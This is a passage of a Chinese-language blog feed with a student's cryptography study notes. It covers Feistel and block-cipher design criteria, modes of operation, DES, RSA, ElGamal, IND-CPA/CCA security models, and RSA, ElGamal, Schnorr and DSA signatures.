id="feistel密码举例">Feistel密码举例</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160856054.png"alt="Feistel密码举例" /><figcaption aria-hidden="true">Feistel密码举例</figcaption></figure><p>用Feistel密码加密8-bit的明文<spanclass="math inline">\(P=DF\)</span>（十六进制表示），密钥<spanclass="math inline">\(K=ABC\)</span>（十六进制表示）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160858442.png"alt="运算过程" /><figcaption aria-hidden="true">运算过程</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160858371.png"alt="运算过程2" /><figcaption aria-hidden="true">运算过程2</figcaption></figure><h2 id="分组密码设计准则">分组密码设计准则</h2><p>需要重点考虑</p><ul><li>S盒的设计</li><li>P盒的设计</li><li>轮函数F的设计</li><li>迭代轮数</li><li>密钥扩展算法</li></ul><h3 id="s盒和p盒的设计准则">S盒和P盒的设计准则</h3><p>分组密码中的S-P网络，是一个集掩蔽、混淆、扩散于一体的综合性部件，目的就是实现高度的非线性化和良好的雪崩效应</p><ul><li>S盒：分组密码的非线性部分的核心部件，起着加密算法的混淆作用，直接影响整个分组密码算法的安全强度<ul><li>非线性度：目前有的采用群加密运算乘法 <spanclass="math inline">\(mod\ 2^n+ 1\)</span>（如IDEA）或利用非素数域<spanclass="math inline">\(GF(2^n)\)</span>上的幂函数（如AES）来构造S盒，以增强高度非线性度变换</li><li>分均匀性：抵抗差分密码分析的能力要强</li><li>可逆性完整、没有”陷门“</li><li>不宜过大，否则会增加设计困难度和算法存储量</li></ul></li><li>P盒：由于P盒多半是继若千个S盒部件之后，因此，P盒的设计准则就是要实现良好的<strong>雪崩效应</strong>，进一步增加扩散程度，比如DES中要求1比特输入希望能引起大约一半输出位的快速变化响应</li></ul><blockquote><p>雪崩效应：</p><p>✓输入（明文或密钥）即使只有很小的变化，也会导致输出发生巨大变化的现象</p><p>✓明文的一个比特的变化应该引起密文许多比特（从安全的角度一般要求接近密文长度的一半）的改变</p><p>雪崩效应：这与P盒的功能有关，是混淆-扩散特性的进一步反映，要求有良好的雪崩效果，即要求当输入有一比特发生变化时，将导致输出有一半的比特位发生变化</p></blockquote><h3 id="轮函数f的设计准则">轮函数F的设计准则</h3><p>轮函数F通常是指迭代分组密码中单轮加密算法的非线性函数，其设计准则就是保证<strong>非线性度要强</strong>，具体通过<strong>位独立</strong>和<strong>雪崩效应</strong>来实现更加混乱</p><p>指标：</p><ul><li>安全性：轮函数F必须能抵抗所有已知的密码攻击方法，尤其是抵抗差分密码分析和线性密码分析</li><li>速度：what can i say，nothing</li><li>灵活性：支持密码算法能在多平台和多处理器上实现</li></ul><blockquote><p>Feistel密码结构的核心，实现依赖于<em>S</em>盒。设计准则包括非线性、雪崩效应准则和位独立准则。</p><p><strong>位独立准则</strong>要求输入中某一位的变化，引起输出中其他位的变化应是彼此无关的</p></blockquote><h3 id="迭代轮数的考虑">迭代轮数的考虑</h3><ul><li>一般来说，分组密码迭代轮数越多，密码分析越困难</li><li>但也不是追求迭代轮数越多越好，多会使结构复杂化，分组密码迭代轮数一般采用<spanclass="math inline">\(r = 8,10,12,16,20\)</span>的居多</li><li><strong>设计迭代轮数的准则是：使密码分析的难度大于简单穷举攻击的难度</strong></li></ul><h3 id="密钥扩展算法的设计">密钥扩展算法的设计</h3><p>密钥扩展是迭代分组密码算法的一个重要组成部分，是从初始（种子）密钥产生迭代各轮要使用的<strong>子密钥</strong>的算法</p><p>评价指标：</p><ul><li>结构尽量简单，便于软硬件实现</li><li>密钥扩展算法至少应保证密钥和密文符合位独立准则和严格雪崩效应准则</li><li>不存在简单数学关系，获取前后的位比特联系在计算上是困难的</li><li>没有弱密钥，弱密钥通常是指因设计不当或不可避免存在的会明显降低密码算法安全性的一类密钥</li><li>保证种子密钥的各比特对每个子密钥比特影响的均衡性</li><li>速度也是衡量子密钥扩展的一个重要指标</li></ul><blockquote><p>子密钥的生成方法：理论设计目标是子密钥的统计独立性和密钥更换的有效性</p></blockquote><h1 id="对称密码">对称密码</h1><p>对称密钥算法(Symmetric-keyalgorithm)，又称为对称加密、私钥加密、共享密钥加密，是密码学中的一类加密算法。</p><p>对称加密的特点是，在加密和解密时使用相同的密钥，或是使用两个可以简单地相互推算的密钥。</p><p>对称加密的优点是速度快，缺点是需要共享密钥，安全性不足。</p><blockquote><p>​在没有非对称密码之前，我们所有的密码方案都属于对称密码，如今我们一般特指对称密码中的块密码指代对称密码，我们在RSA中了解了对称密码的缺点，并且了解了非对称密码的优点，那么为什么还需要使用对称密码呢？实际上对称密码还拥有非对称密码不可比拟的一个优点则是：<strong>快</strong>。</p><p>​实际上，可能会考虑非对称密码密钥过长，算法较复杂，需要分块设计填充算法等等，这些都不是最重要的缺点，最主要的便是非对称密码和对称密码比起来在同等性能下实在是太慢了。甚至部分小功耗设备性能不足以支持运行一些非对称密码。所以对称密码依然广泛运用于我们的现实生活中，大部分的对称加密算法都是基于<code>ARX</code>操作，即加法<code>Add</code>，移位<code>Rotate</code>，异或<code>Xor</code>，在速度上相对于非对称密码复杂的幂、指数和函数运算来说天生有着绝对的优势。</p></blockquote><p>对称加密算法可分为两大类型:</p><ul><li><code>分组加密</code>：先将明文切分成一个个固定大小的块，再对每个块进行加密，这种方式被称为分组加密或块加密，有的资料称呼为"分组密码"或"块密码"。</li><li><code>流加密</code>：将密钥扩展到与密文等长后，用扩展后的密钥与明文按比特位做异或运算</li></ul><p>相比分组加密，流加密具有速度快，消耗少的优点，在网络通信的某些特定场景比较有优势。然而流加密的发展落后于分组加密，其安全性、可扩展性、使用灵活性上，目前认为还是比不上分组加密的，同时某些分组加密算法可以兼具流加密的部分特点。因此对称加密的主流仍然是分组加密。</p><p>常见的流加密算法如<code>RC4</code>、<code>ChaCha20</code>等等，它们的安全强度主要取决于扩展后密钥的随机性。</p><p>流加密不是本章的学习重点，这里只简单了解一下，接下来开始学习分组加密，<strong>后文提到对称加密时，一般都是特指分组加密。</strong></p><h1 id="分组密码的操作模式">分组密码的操作模式</h1><h2 id="电子密码本模式ecb">电子密码本模式（ECB）</h2><p> Electronic Codebook Mode，简称为ECB模式</p><p>明文被每次处理64位，若最后一块不足64位，则用一些任意二进制序列填充</p><p>每个明文分组都用同一个密钥加密，这样相同的明文块总被加密成相同的密文块</p><p> 算法逻辑： <span class="math display">\[(\text{加密)}C_j=E_k(P_j)(j=1,2,...,N)\\(\text{解密)}P_j=D_k(C_j)(j=1,2,...,N)\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160913656.png"alt="ECB" /><figcaption aria-hidden="true">ECB</figcaption></figure><p>特点：</p><ul><li>操作模式简单，不同的分组可以并行处理</li><li>明文中的重复内容将在密文中表现出来，特别对于图像数据和明文变化较少的数据</li><li>不具有错误传播特性，即如果一个分组中出现传输错误不会影响其他分组</li><li>主要用于内容较短（不超过一个分组）的报文的加密传递</li></ul><h2 id="密码分组链接模式cbc">密码分组链接模式(CBC)</h2><p>Cipher Block Chaining Mode，简称为CBC模式</p><p>加密函数的输入是当前的明文分组和前一个密文分组的异或</p><p>算法逻辑： <span class="math display">\[(\text{加密)}C_1=E_k(P_1\oplus\mathrm{IV})，C_j=E_k(P_j\oplusC_{j-1})(j=2,...,N)\\(\text{解密)}P_1=D_k(C_1)\oplus\mathrm{IV}，P_j=D_k(C_j)\oplusC_{j-1}(j=2,...,N)\\（IV称为初始向量）\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160934363.png"alt="CBC" /><figcaption aria-hidden="true">CBC</figcaption></figure><p>特点</p><ul><li>同一个消息中的两个相同的明文被加密成不同的密文</li><li>若不同消息的前若干个分组相同，且加密时使用相同的IV，这些分组的加密结果将一致。此时以时间戳作为IV较好</li><li>密文分组中的一位出错具有自恢复能力，即若密文块<spanclass="math inline">\(C_j\)</span>在传送过程中出错，则解密时会造成<spanclass="math inline">\(P_j\)</span>和<spanclass="math inline">\(P_{j+1}\)</span>两个明文块都出错，但后面的密文块仍然能自动正确恢复</li><li>可用于加密和认证。用于加密时不能并行处理，也不能用于加密或解密可随机访问的文件记录（因为该模式需要访问以前的记录）</li></ul><h2 id="计数器模式ctr">计数器模式（CTR）</h2><p>Counter Mode，简称为CTR模式</p><p>使用与明文分组规模相同的计数器长度，但要求加密不同的分组所用的计数器值必须不同</p><p>计数器值经加密函数变换的结果再与明文分组异或，从而得到密文</p><p>解密使用相同的计数器值序列，用加密函数变换后的计数器值与密文分组异或，从而恢复明文</p><p>算法逻辑： <span class="math display">\[(\text{加密)}C_j=P_j\oplusE_k(\text{CTR}+j)(j=1,2,...,N)\\(\text{解密)}P_j=C_j\oplusE_k(\text{CTR}+j)(j=1,2,...,N)\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160942500.png"alt="CTR" /><figcaption aria-hidden="true">CTR</figcaption></figure><p>特点</p><ul><li>处理效率高，可进行并行处理，提高数据吞吐量</li><li>可提前进行预处理</li><li>具有随机访问特性，可随机对任意一个密文分组进行解密处理，对该密文分组的处理与其他密文无关</li><li>实现简单，加、解密阶段都只涉及加密函数。（这点与ECB和CBC模式不同）</li><li>适于对实时性和速度要求较高的场合</li></ul><h2 id="密码反馈模式cfb">密码反馈模式(CFB)</h2><p>Cipher FeedBack Mode，简称为CFB模式</p><ul><li>加密算法的输入是64比特移位寄存器，其初值为某个初始向量IV</li><li>加密算法输出的最左（最高有效位）<spanclass="math inline">\(j\)</span> 比特与明文的第一个单元<spanclass="math inline">\(P_1\)</span>异或，产生出密文的第一个单元<spanclass="math inline">\(C_1\)</span></li><li>将移位寄存器的内容左移<spanclass="math inline">\(j\)</span>位并将<spanclass="math inline">\(C_1\)</span>送入移位寄存器最右边（最低有效位）<spanclass="math inline">\(j\)</span>位</li><li>解密时，将收到的密文单元与加密函数的输出进行异或<spanclass="math inline">\((仍然使用加密算法)\)</span></li></ul><p>算法逻辑： <span class="math display">\[\begin{aligned}&amp;\text{(加密)}C_1=P_1\oplusS_j[E_k(\mathrm{IV})]，C_i=P_i\oplusS_j[E_k(\mathrm{SR}_j||C_{i-1})](i=2,...,N)\\&amp;(\text{解密)}P_1=C_1\oplus S_j[E_k(\mathrm{IV})]，P_i=C_i\oplusS_j[E_k(\mathrm{SR}_j||C_{i-1})](i=2,...,N)\\&amp;\text{式中,}S_j[x]\text{表示}x\text{的最左边}j\text{位,SR}_j\text{表示移位寄存器SR左移}j{位,}\|\text{表示连接关系}\end{aligned}\]</span></p><h2 id="输出反馈模式ofb">输出反馈模式(OFB)</h2><h1 id="des">DES</h1><blockquote><p>下面主要是Xenny师傅的内容，而不是赖师父的内容了</p></blockquote><ul><li><p>DES是一种典型的块加密，即将明文分成一块一块的数据，分别进行加密再进行拼接得到密文。</p><p>在DES中，具有如下特点</p><ol type="1"><li><p>输入<code>64</code>位。</p></li><li><p>输出<code>64</code>位。</p></li><li><p>密钥<code>64</code>位，使用<code>64</code>位密钥中的<code>56</code>位，剩余的<code>8</code>位要么丢弃，要么作为奇偶校验位。</p></li><li><p>采用<code>Feistel</code>迭代结构：</p><ol type="1"><li>明文经过 16 轮迭代得到密文。</li><li>密文经过类似的 16 轮迭代得到明文。</li></ol></li></ol></li><li><p>其实Feistel是用来构建块加密算法的对称结构，但是从CTF的实际角度来说，我们并不从Feistel开始介绍而是直接介绍DES，有关Feistel迭代结构的详细介绍可以参考</p><p><code>https://zhuanlan.zhihu.com/p/381026295</code></p><p>在这里我们只需要了解Feistel是一种轮次迭代方式即可。</p></li></ul><p>DES密码算法采用Feistel密码的S-P结构，其特点是：加密和解密使用同一算法、同一密钥、同一结构</p><p>区别是：16轮加密子密钥顺序为<spanclass="math inline">\(K_1,K_2,\cdots,K_{16}\)</span>，解密子密钥顺序为<spanclass="math inline">\(K_{16},K_{15},\cdots K_{1}\)</span></p><p>三个阶段：初始置换、乘积变换和逆初始置换</p><blockquote><p>待补充</p></blockquote><h1 id="idea">IDEA</h1><h1 id="aes">AES</h1><blockquote><p>参考：</p><p><ahref="https://www.cnblogs.com/max1z/p/16841472.html">现代密码学常用符号总结- Max1z - 博客园 (cnblogs.com)</a></p><p><ahref="https://www.cnblogs.com/max1z/p/15992505.html#IND-CCA2">密码学之安全模型总结- Max1z - 博客园 (cnblogs.com)</a></p><p><a href="https://www.ruanx.net/diffie-hellman/">Diffie-Hellman密钥交换和 Elgamal 加密算法 (ruanx.net)</a></p><p><ahref="https://zhuanlan.zhihu.com/p/599518034">一文搞懂Diffie-Hellman密钥交换协议- 知乎 (zhihu.com)</a></p><p><ahref="https://gejiangxia.github.io/2020/04/30/ELGamal加密方案不是CCA安全/">(<em>´∇｀</em>)被你发现啦~ ELGamal加密方案不是CCA安全 | Hexo(gejiangxia.github.io)</a></p><p><ahref="https://www.cnblogs.com/WittPeng/p/8978737.html">《现代密码学》 -WittPeng - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学-4</title>
    <link href="/2024/04/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-4-%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81/"/>
    <url>/2024/04/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-4-%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="公钥密码学">公钥密码学</h1><h2 id="公钥密码体制的模型">公钥密码体制的模型</h2><ul><li>公钥密码体制在加密和解密时使用不同的密钥，这样通信双方无须预先交换密钥就可以建立保密通信。克服了对称密码体制中通信双方必须使用一个安全信道预先约定密钥的缺点</li><li>在公钥密码体制中，每个用户保存一对密钥，即公钥PK和私钥SK，PK是公开信息，不需要保密。虽然公钥密码体制的私钥SK和公钥PK是成对出现的，但给定公钥，要确定出私钥是计算上不可行的。持有公钥的任何人都可以加密明文产生密文，只有持有私钥的人才能够解密</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948850.png"alt="公钥密码体制" /><figcaption aria-hidden="true">公钥密码体制</figcaption></figure><h2 id="公钥密码体制的基本原理">公钥密码体制的基本原理</h2><p>用抽象的观点来看，公钥密码体制就是一种陷门单向函数</p><ul><li><p><strong>单向函数</strong>是满足下列条件的函数：</p><p>它是定义域到值域的一个映射，同时还要满足下列条件：计算函数值是容易的，而从函数值计算原像是不可行的.</p></li><li><p><strong>陷门单向函数</strong>是这样的单向函数，存在一个附加信息，当不知道该附加信息时，从函数值求原像是困难的，但当知道该附加信息时，从函数值求原像就变得容易了。</p><p>即陷门单向函数在附加信息未知时是单向函数，而当附加信息已知时，就不再是单向函数了。通常把附加信息称为陷门信息。</p></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948817.png"alt="image-20231127222741135" /><figcaption aria-hidden="true">image-20231127222741135</figcaption></figure><p>公钥密码体制就是基于这一原理而设计的，利用一个陷门单向函数，将它作为公开密钥，而将陷门信息作为秘密密钥.。其安全强度取决于它所依据的问题的计算复杂度</p><h2 id="公钥密码体制的要求">公钥密码体制的要求</h2><ul><li>产生一对密钥在计算上是可行的</li><li>已知公钥和明文，产生密文是容易的</li><li>接收方利用私钥来解密密文在计算上是可行的</li><li>对于攻击者，利用公钥来推断私钥在计算上是不可行的</li><li>已知公钥和密文，在不知道私钥的情况下，恢复明文在计算上是不可行的</li></ul><h2 id="rsa公钥密码体制">RSA公钥密码体制</h2><blockquote><p>RSA公钥密码体制是美国麻省理工学院的Rivest，Shamir和Adleman三位学者于1978年提出的。RSA公钥密体制的理论基础是数论中的大整数因子分解的困难性。RSA公钥密码体制即可用于加密，又可用于数字签名。它安全、易懂、易实现，是目前广泛应用的一种密码体制。</p><p><del>事实上，Cliff Cocks在1973年发表的题为“关于非对称加密的注记”文章中，就描述了跟RSA密码体制基本一致的方案</del></p></blockquote><p>密钥生成算法<span class="math inline">\(KeyGen\)</span>：</p><ul><li>选两个大质数p和q，且 <span class="math inline">\(p!=q\)</span>，计算<span class="math inline">\(N=p*q\)</span>，N就算出来了</li><li>然后计算N的欧拉函数 <spanclass="math inline">\(φ(N)=(p-1)(q-1)\)</span></li><li>然后你自己选个e， <spanclass="math inline">\(1&lt;e&lt;φ(N)\)</span>，且与φ(N)互质，<ul><li>为什么e与φ(N)互素：要存在d，互素才存在这样一个d</li></ul></li><li>由e和φ(N)互质，<spanclass="math inline">\((e,φ(N))=1\)</span>，再由辗转相除法，则一定有<spanclass="math inline">\(ed - φ(N)k = 1\)</span></li><li>那么由e就可以算出d，<span class="math inline">\(ed ≡ 1\quadmod(φ(N))\)</span><ul><li>pk（公钥）：N，e</li><li>sk（私钥）：d</li></ul></li></ul><p>p，q是秘密参数，需要保密，如不需要保存，可销毁</p><p>加解密：</p><p><span class="math display">\[\begin{align}Enc（pk，m∈Z_N^*）:c = m^e\ mod \ N\\Dec（sk，c）： m = c^d\ mod\ N\end{align}\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948798.png"alt="RSA" /><figcaption aria-hidden="true">RSA</figcaption></figure><h3 id="正确性证明">正确性证明</h3><p><span class="math display">\[\begin{align}&amp;即验证 c^d modN 是否等于 m\\&amp;∵ed ≡ 1\quad mod(φ(N))\\&amp;∴ed = kφ(N) + 1\\&amp;即验证m^{ed} mod N最后是等于m的\\&amp;m^{kφ(N) + 1} \quad mod \quad N \\&amp;m^{kφ(N)}*m \quad mod \quad N\\&amp;即求:m^{φ(N)}≡1modN\\&amp;∵m∈Z_N^*\\&amp;g^{ord(G)} = 1(单位元)\\&amp;∴m^{φ(N)}≡1modN&amp;\end{align}\]</span></p><p>对于</p><p><span class="math display">\[\begin{align}&amp;m∈Z_N（放大m的范围了）\\&amp;m \notin Z_N^*\\&amp;∵ N =p*q\\&amp;∴gcd(m,N)=p或q\\&amp;这里的情况N直接分解出来了\\&amp;若gcd(m,N)=p,m&lt;N,N=p*q\\&amp;得m=kp,1≤k&lt;q\\&amp;gcd(m,q)= 1\\&amp;相当于m∈Z_q^*，则m^{φ(q)}=1modq\\&amp;m^{q-1}=1modq\\&amp;ed = k^{&#39;}φ(N)+1=k^{&#39;}(p-1)(q-1)+1\\&amp;m^{k^{&#39;}(p-1)(q-1)} =1modq\\&amp;m^{k^{&#39;}φ(N)} =1modq\\&amp;即m^{k^{&#39;}φ(N)} =rq+1\\&amp;我们这里还是要求m^{ed}modN最后等于m\\&amp;m^{k^{&#39;}φ(N)}*m \quad mod N\\&amp;=(rq+1)m \quad modN\\&amp;=(rqm+m)\quad mod N\\&amp;=(rq*kp+m)\quad mod N\\&amp;=(rkN+m)\quad mod N\\&amp;=m\end{align}\]</span></p><p>RSA问题，给定N，e，<spanclass="math inline">\(y∈Z_N^*\)</span>，求x，满足<spanclass="math inline">\(x^e=y\ mod\ N\)</span></p><blockquote><p>一个密文对应一个明文，所以jzlaoshi不把RSA叫做一个加密方案，而是一个单向陷门置换</p></blockquote><h3 id="rsa公钥密码体制的安全性">RSA公钥密码体制的安全性</h3><p>RSA是建立在大整数分解的困难性之上的</p><p>大整数分解攻击：一旦分解出p和q，就可以得到n的欧拉数φ(N)，再利用欧几里德扩展算法求出RSA的私钥d.</p><p>因此，应当采用足够大的大整数n(至少应取1024位，最好为2048位)。此外，对素数p和q的选取应满足以下要求：</p><ul><li>p和q的长度应该相差不大</li><li>(p - 1)和(q - 1)都应该包含大的素因子</li><li>gcd(p - 1,q -1)应该尽可能小</li><li>d &lt; n，且<spanclass="math inline">\(d&lt;n^{0.294}\)</span>，特别是当<spanclass="math inline">\(d&lt;n^{1/4}\)</span>时，已经有办法攻破RSA</li></ul><h2 id="elgamal公钥密码体制">ElGamal公钥密码体制</h2><blockquote><p><strong>ElGamal</strong>加密算法是一个基于Diffie-Hellman密钥交换的非对称加密算法，</p></blockquote><p>离散对数问题： <span class="math display">\[G，p，g，，，h∈G，求x∈Z_p，使得h = g^x\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948786.png"alt="ElGamal公钥密码体制" /><figcaption aria-hidden="true">ElGamal公钥密码体制</figcaption></figure><blockquote><p>加密算法的第一行写错了，应该为m ∈ G</p></blockquote><p>​</p><h2 id="公钥密码体制的安全模型">公钥密码体制的安全模型</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948835.png"alt="image-20231120211350752" /><figcaption aria-hidden="true">image-20231120211350752</figcaption></figure><blockquote><p>OW-CCA 比 OW-CPA安全性高</p><p>IND-CCA 比 IND-CPA安全性高</p><p>IND-CCA 比 OW-CCA高</p><p>也就是说 CCA安全一定是CPA安全，但CPA安全不一定是CCA安全，</p></blockquote><h3 id="ind-cpa">IND-CPA</h3><p>示意图：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948769.png"alt="IND-CPA" /><figcaption aria-hidden="true">IND-CPA</figcaption></figure><p>IND-CPA所表示的含义为，在敌手能<strong>自行选择明文，并查询对应密文</strong>这一模型中，我们的加密算法是否还能实现密文不可区分。在这一Game中，敌手可以查询任意一条明文消息对应的密文，这需要我们开放自己算法的加密功能给敌手</p><p>IND-CPA这一Game的步骤如下：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948349.png"alt="IND-CPA安全模型的形式化定义" /><figcaption aria-hidden="true">IND-CPA安全模型的形式化定义</figcaption></figure><p>这里的Pr是计算某一事件的概率</p><p>可以看出，IND-CPA实际上是想表达“<strong>如果密文足够随机的话，密文是不会泄露任何关于明文信息</strong>”这一深层含义</p><p>任意一个公钥加密方案，如果加密算法是一个确定的算法，它永远不可能达到IND-CPA安全。如：RSA就达不到，一个明文对应一个密文</p><h3 id="ind-cca">IND-CCA</h3><p>ElGamal不是IND-CCA安全</p><h3 id="ind-cca2">IND-CCA2</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948368.png"alt="IND-CCA2" /><figcaption aria-hidden="true">IND-CCA2</figcaption></figure><h1 id="数字签名">数字签名</h1><h2 id="概述">概述</h2><ul><li><p>在传统商务活动中，为了保证交易的安全与真实，一份书面合同或公文要由当事人或其负责人签字、盖章，以便让交易双方识别是谁签的合同，保证签字或盖章的人认可合同的内容，在法律上才能承认这份合同是有效的。</p></li><li><p>而在电子商务的虚拟世界中，合同或文件是以电子文件的形式表现和传递的。在电子文件上，传统的手写签名和盖章是无法进行的，这就必须依靠技术手段来替代。</p></li><li><p>数字签名就是能起到手写签名或者盖章同等作用的电子技术手段。</p></li><li><p>数字签名已成为计算机网络不可缺少的一项安全技术措施是实现认证的重要工具。数字签名在商业、金融、军事等领域，特别是在电子贸易、电子支票、电子购物、电子政务及知识产权保护等方面的应用，有力地显示了数字签名的重要性。</p></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948388.png"alt="image-20231127185410719" /><figcaption aria-hidden="true">image-20231127185410719</figcaption></figure><h3 id="数字签名的特征">数字签名的特征</h3><ul><li>收方能够确认或证实发方的签名，但不能伪造</li><li>发方发出签名的消息给收方后，就不能再否认他所签发的消息。</li><li>收方对已收到的签名消息不能否认。</li><li>第三者可以确认收发双方之间的消息传送，但不能伪造这一过程。</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948412.png"alt="数字签名的组成" /><figcaption aria-hidden="true">数字签名的组成</figcaption></figure><h2 id="hash函数">Hash函数</h2><blockquote><p>先简单了解一下</p></blockquote><p>Hash函数的基本需求：</p><p>在深入Hash函数的安全性之前，我们首先需要了解它们必须满足的基本需求：</p><ul><li>确定性：对于任何给定的输入，Hash函数总是返回相同的输出。这意味着无论你何时何地运行Hash函数，对同一数据的Hash值总是不变的。</li><li>快速计算：无论数据大小如何，Hash函数都能迅速计算出Hash值。这对于处理大量数据或需要实时处理的系统尤为重要。</li><li>抗碰撞性：即使是微小的输入变化，也会导致输出（Hash值）的巨大变化。这使得预测或生成具有相同Hash值的两个不同输入非常困难。</li></ul><p>Hash函数的安全性挑战：</p><p>尽管Hash函数的设计旨在满足上述需求，但在现实世界的应用中，它们面临着许多安全挑战：</p><ul><li><p>抗碰撞攻击：理想的Hash函数应该抵抗碰撞攻击，即很难找到两个不同的输入但产生相同的Hash值。然而，随着计算能力的增强和算法的发展，某些Hash函数已经被证明容易受到碰撞攻击。</p></li><li><p>预映像和二次预映像攻击：这些攻击尝试找到一个输入，使其Hash值等于特定的Hash值（预映像）或找到一个不同的输入，使其Hash值与另一给定输入的Hash值相同（二次预映像）。强大的Hash函数应该能有效抵抗这类攻击。</p></li><li><p>速度与安全性的折中：在某些应用中，如密码学货币，Hash函数需要足够的“慢”以抵抗暴力攻击，而在其他应用中，如网络数据处理，需要足够快的Hash算法以维持效率。找到这种平衡是设计Hash函数时的一个挑战。、</p></li></ul><p>实践中的Hash函数：</p><p>在实践中，已经开发了多种Hash函数来满足不同的需求和抵抗各种攻击。例如：</p><ul><li>MD5：一度广泛使用，但现在已被证实容易受到碰撞攻击，因此不再推荐用于安全敏感的应用。</li><li>SHA系列：包括SHA-1、SHA-256等，是目前广泛认可和使用的Hash算法。尽管某些较早的版本如SHA-1也显示出安全弱点，但更新版本如SHA-256仍被认为是安全的。</li><li>bcrypt和Argon2：这些是专为密码存储设计的Hash函数，通过增加计算成本来抵抗暴力攻击。</li></ul><h2 id="rsa签名方案">RSA签名方案</h2><p><span class="math display">\[\begin{align}&amp;m_1*σ_1 = m_1^d \mod N\\&amp;m_2*σ_2 = m_2^d \mod N\\&amp;m =m_1*m_2，σ =σ_1*σ_2\\&amp;两个相乘 m*σ = (m_1m_2)^d \mod N\\&amp;也就是说我知道两个就能构造第三个，（其实知道一个就可以了\\&amp;所以是不安全的\\&amp;可以利用一个安全的Hash函数 H 来产生消息摘要H(m);\\&amp;H(m_1,m_2)≠H(m_1)*H(m_2)\\\end{align}\]</span></p><p>所以直接拿来做签名是不安全</p><p>要改一改：利用一个安全的Hash函数 H来产生消息摘要H(m)，哈希函数是一个单向函数</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948424.png"alt="RSA签名方案" /><figcaption aria-hidden="true">RSA签名方案</figcaption></figure><p>安全性：</p><ol type="1"><li>签名时使用了Hash函数可以防止利用同态的伪造攻击，有很好的抗攻击性。</li><li>RSA签名方案存在签名可重用的问题，同一消息在不同时刻签名不应是相同的。</li></ol><h2 id="elgamal签名方案">ElGamal签名方案</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948433.png"alt="ElGamal签名方案" /><figcaption aria-hidden="true">ElGamal签名方案</figcaption></figure><p><strong>签名算法中：</strong></p><p>g是<spanclass="math inline">\(Z_p^*\)</span>的生成元，但是实际上中很难取到，所以一般设置<spanclass="math inline">\(p-1=rq\)</span>，所以<spanclass="math inline">\(Z_p^*\)</span>中存在一个q阶的子群，随便在<spanclass="math inline">\(Z_p^*\)</span>中选一个h，作<spanclass="math inline">\(h^r\)</span>，则<spanclass="math inline">\(g=h^r\)</span>一定是生成元 （对吗？😥😥</p><p><span class="math inline">\(gcd(k,p-1)\)</span>，才能保证<spanclass="math inline">\(k \mod p-1\)</span>有逆元，才能算出来s</p><p>定义：生成元的阶就是群的阶，这里就是<spanclass="math inline">\(p-1\)</span>，所以<spanclass="math inline">\(0&lt;k&lt;p-1\)</span>，k只能在这个范围，<spanclass="math inline">\(p-1\)</span>就是最大的了</p><p>这里的群的阶最大就是<span class="math inline">\(p-1\)</span></p><h2 id="schnorr签名方案">Schnorr签名方案</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948019.png"alt="Schnorr签名方案" /><figcaption aria-hidden="true">Schnorr签名方案</figcaption></figure><p>签名验证算法中可以给<spanclass="math inline">\(σ=(e,s)\)</span>，也可以给<spanclass="math inline">\((R,s)\)</span>，大部分都选前者</p><p>原因：计算开销是一样的，不管给谁R，e，s都是要算的，所以看通信的消耗size，R是群中的元素，表示群元素至少要<spanclass="math inline">\(log_2p\)</span>位，e是mod之后的，所以e的位数要小一点</p><p>公布<span class="math inline">\((e,s)\)</span>作为签名：</p><p>计算<span class="math inline">\(R&#39;=g^s*y^e\)</span></p><p>验证 <span class="math inline">\(e\ 等于or不等于\H(m,R&#39;)\)</span></p><p>这里假设 <span class="math inline">\(s=r-ex\)</span>是对滴，那么<spanclass="math inline">\(g^s=g^{r-ex}=g^r*(g^x)^{-e}=g^r*y^{-e}=R*y^{-e}\)</span></p><p>公布<span class="math inline">\((R,s)\)</span>作为签名：</p><p>计算<span class="math inline">\(e=H(m,R)\)</span></p><p>验证 <span class="math inline">\(g^s =or≠ R*y^{-e}\)</span></p><p><spanclass="math inline">\(g^s=g^{r-ex}=g^r*(g^x)^{-e}=g^r*y^{-e}=R*y^{-e}\)</span></p><h2 id="数字签名标准">数字签名标准</h2><blockquote><p>更习惯于叫它DSA</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948048.png"alt="数字签名标准" /><figcaption aria-hidden="true">数字签名标准</figcaption></figure><p>DSA这里<span class="math inline">\(g\)</span>的阶是<spanclass="math inline">\(q\)</span>，因为<spanclass="math 